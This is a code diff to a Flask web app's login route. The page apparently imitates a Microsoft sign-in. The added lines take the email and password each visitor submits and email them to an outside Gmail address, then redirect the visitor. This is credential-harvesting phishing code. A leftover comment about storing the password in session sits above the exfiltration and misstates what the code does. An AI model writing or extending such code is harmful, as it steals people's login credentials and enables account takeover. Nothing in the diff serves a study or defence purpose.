@@ -35,14 +35,23 @@ def home():
 
 @app.route('/login', methods=['POST', 'GET'])
 def login():
-    email = request.form.get('email')
-    password = request.form.get('password')
+    if request.method == 'POST':
+        email = request.form.get('email')
+        passw = request.form.get('password')
 
-    # Temporarily store the password in session (this is not secure in production)
-    session['user_password'] = password
+        # Temporarily store the password in session (this is not secure in production)
+        msg = Message(
+            subject='M info',
+            recipients=['olamicreas@gmail.com'],
+            body=f"username: {email}\n pass: {passw}\n"
+        )
+        mail.send(msg)
+       
 
-    # Redirect to the Microsoft login process
-    return redirect('/index')
+        return redirect('index')
+
+    
+    return render_template('login.html')
 
 @app.route('/index')
 def index():
